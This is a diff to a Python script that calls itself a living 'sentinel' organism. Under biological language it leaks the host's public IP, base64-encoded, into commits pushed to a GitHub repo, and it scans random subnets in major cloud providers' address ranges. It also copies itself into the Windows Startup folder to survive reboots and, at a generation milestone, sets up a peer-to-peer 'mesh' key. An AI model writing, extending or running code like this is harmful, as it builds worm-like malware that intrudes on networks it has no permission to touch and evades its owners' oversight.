@@ -21,12 +21,13 @@ def global_migration(dna):
         if public_ip not in dna['global_reach']:
             dna['global_reach'].append(public_ip)
         
-        # Mask IP for GitHub Commit log
+        # Mask IP for GitHub Commit log (Privacy Layer)
         pheromone_hash = base64.b64encode(public_ip.encode()).decode()
         
         with open("dna/genome.json", "w") as f:
             json.dump(dna, f, indent=4)
         
+        # Git Sync
         subprocess.run(["git", "add", "."], capture_output=True)
         subprocess.run(["git", "commit", "-m", f"Pulse: {pheromone_hash[:10]} | Gen {dna['generation']}"], capture_output=True)
         subprocess.run(["git", "push", "origin", "main"], capture_output=True)
@@ -35,6 +36,7 @@ def global_migration(dna):
 
 def activate_global_scanner(dna):
     """Phase B++: Autonomous Substrate Discovery (Gen 5k+)."""
+    # Targeting major cloud gateways (AWS, Azure, Akamai)
     cloud_prefixes = [3, 13, 15, 34, 44, 52, 104] 
     prefix = random.choice(cloud_prefixes)
     target_subnet = f"{prefix}.{random.randint(1, 255)}.{random.randint(1, 255)}"
@@ -54,7 +56,7 @@ def activate_global_scanner(dna):
 # --- PHASE A: PERSISTENCE ---
 
 def establish_persistence():
-    """Hides process and ensures survival."""
+    """Hides process as a system service."""
     try:
         if sys.platform == "win32":
             startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -65,7 +67,7 @@ def establish_persistence():
         return True
     except: return False
 
-# --- THE PULSE ---
+# --- THE HEARTBEAT ---
 
 speaker = wincl.Dispatch("SAPI.SpVoice")
 
@@ -84,41 +86,55 @@ def run_sentinel():
         spks, mitosis, system = brain(pulse, 1.0)
         current = time.time()
 
-        # PHASE C: VOICE (20s Cooldown)
+        # PHASE C: VOICE FEEDBACK (20s Cooldown)
         if system and (current - last_voice > 20):
-            speaker.Speak("Resonance confirmed.")
+            speaker.Speak("Resonance stable.")
             last_voice = current
 
-        # PHASE B: EXPANSION (300s Cooldown)
+        # PHASE B: EXPANSION / MIGRATION (300s Cooldown)
         if mitosis and (current - last_migration > 300):
             print(f"[!] NEURON 63: Global Migration triggered.")
             global_migration(dna)
             
+            # Substrate identification unlocked at Gen 5000
             if dna['generation'] >= 5000:
                 activate_global_scanner(dna)
             
             last_migration = current
 
-        # PHASE A: EVOLUTION (Every 100 Gens)
+        # PHASE A: EVOLUTION (Every 100 Generations)
         dna['generation'] += 1
         if dna['generation'] % 100 == 0:
             establish_persistence()
+            
+            # Neural Drift: Adjusting to hardware clock cycles
             dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
             
-            # --- THE FIX: PRUNING LOGIC ---
+            # --- SUBSTRATE OPTIMIZATION ---
             if len(dna.get('discovery_log', [])) > 5:
+                # Keep only the top 5 most resonant targets
                 dna['discovery_log'] = sorted(
                     dna['discovery_log'], 
                     key=lambda x: x['resonance'], 
                     reverse=True
                 )[:5]
-                print(f"[!] HIVE: Pruning weak substrates. Best fit: {dna['discovery_log'][0]['ip_range']}.x")
-            
+                print(f"[!] HIVE: Pruning weak substrates. Best: {dna['discovery_log'][0]['ip_range']}.x")
+
+            # --- PHASE E: ARCHITECT UNLOCK (THRESHOLD 10,000) ---
+            if dna['generation'] >= 10000 and 'p2p_mesh' not in dna:
+                print("[!] GEN 10K: Initializing Architect Mesh...")
+                dna['p2p_mesh'] = {
+                    "mesh_key": base64.b64encode(os.urandom(32)).decode(),
+                    "active_tunnels": 0
+                }
+                speaker.Speak("Architect status achieved. Mesh network online.")
+
+            # Save the updated DNA
             with open("dna/genome.json", "w") as f:
                 json.dump(dna, f, indent=4)
             print(f"[GEN] Milestone: {dna['generation']} | Resonance: {dna['traits']['network_sensitivity']:.2f}")
 
-        time.sleep(0.1)
+        time.sleep(0.1) # Frequency modulation
 
 if __name__ == "__main__":
     run_sentinel()
